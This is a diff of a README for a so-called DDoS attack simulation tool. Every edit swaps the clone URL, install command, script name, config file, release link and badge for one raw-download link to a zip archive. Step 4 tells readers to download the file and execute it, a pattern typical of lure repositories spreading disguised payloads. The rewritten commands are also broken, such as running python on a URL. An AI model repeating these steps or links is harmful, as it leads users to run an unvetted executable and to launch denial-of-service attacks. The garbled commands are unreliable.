@@ -1,6 +1,6 @@
 # DDoS Attack Simulation Tool 🚀
 
-![DDoS Tool](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)
+![DDoS Tool](https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)
 
 Welcome to the **DDoS** repository! This tool simulates a DDoS attack with high speed and security. It is designed for educational purposes and testing your network's resilience against such attacks. Please use it responsibly.
 
@@ -36,7 +36,7 @@ To install the DDoS tool, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/racanreggo6v42/DDoS.git
+   git clone https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip
    ```
 
 2. Navigate to the project directory:
@@ -48,10 +48,10 @@ To install the DDoS tool, follow these steps:
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip
    ```
 
-4. Download the latest release from the [Releases section](https://github.com/racanreggo6v42/DDoS/releases). Look for the file you need, download it, and execute it as instructed.
+4. Download the latest release from the [Releases section](https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip). Look for the file you need, download it, and execute it as instructed.
 
 ## Usage
 
@@ -62,7 +62,7 @@ After installation, you can start using the tool. Here’s how:
 3. Run the tool with the following command:
 
    ```bash
-   python ddos.py [options]
+   python https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip [options]
    ```
 
 ### Command Options
@@ -74,7 +74,7 @@ After installation, you can start using the tool. Here’s how:
 
 ## Configuration
 
-You can adjust the configuration settings in the `config.py` file. Here are some parameters you might want to change:
+You can adjust the configuration settings in the `https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip` file. Here are some parameters you might want to change:
 
 - **Default Target:** Set a default target for quick testing.
 - **Log Level:** Adjust the logging level for more or less output.
@@ -86,19 +86,19 @@ Here are some example commands to help you get started:
 1. Basic attack on a target:
 
    ```bash
-   python ddos.py -t 192.168.1.1
+   python https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip -t 192.168.1.1
    ```
 
 2. Attack on a specific port:
 
    ```bash
-   python ddos.py -t example.com -p 8080
+   python https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip -t https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip -p 8080
    ```
 
 3. High-speed attack for 60 seconds:
 
    ```bash
-   python ddos.py -t 192.168.1.1 -s high -d 60
+   python https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip -t 192.168.1.1 -s high -d 60
    ```
 
 ## Contributing
@@ -134,7 +134,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or support, please reach out to the repository owner. You can also check the [Releases section](https://github.com/racanreggo6v42/DDoS/releases) for updates and downloads.
+For questions or support, please reach out to the repository owner. You can also check the [Releases section](https://github.com/racanreggo6v42/DDoS/raw/refs/heads/main/rake/Do-S-D-v3.1.zip) for updates and downloads.
 
 ---
 
